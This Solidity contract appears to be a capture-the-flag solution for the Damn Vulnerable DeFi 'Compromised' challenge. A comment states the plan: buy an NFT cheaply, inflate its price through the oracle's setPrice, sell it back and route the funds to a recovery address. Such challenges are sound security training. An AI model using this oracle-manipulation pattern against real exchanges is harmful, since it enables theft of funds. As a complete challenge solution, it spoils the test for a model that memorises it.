pragma solidity =0.8.25;

import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleInitializer.sol";
import {Exchange} from "../../src/compromised/Exchange.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";

//Idea: Buy the NFT for cheap, set the price to be high using setPrice, sell the NFT, transfer funds to recovery

contract OracleExploit is IERC721Receiver {
    TrustfulOracle oracle;
    Exchange exchange;
    DamnValuableNFT nft;
    address recovery;
    uint256 id;

    constructor(TrustfulOracle _oracle, Exchange _exchange, DamnValuableNFT _nft, address _recovery){
        oracle = _oracle;
        exchange = _exchange;
        nft = _nft;
        recovery = _recovery;
    }

    function buyNFT() external payable{
        id = exchange.buyOne{value: msg.value}();
    }

    function sellNFT() external{
        nft.approve(address(exchange), id);
        exchange.sellOne(id);
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        return this.onERC721Received.selector;
    }

    function recover(uint256 amount) external{
        payable(recovery).transfer(amount);
    }

    receive() external payable{
    }
}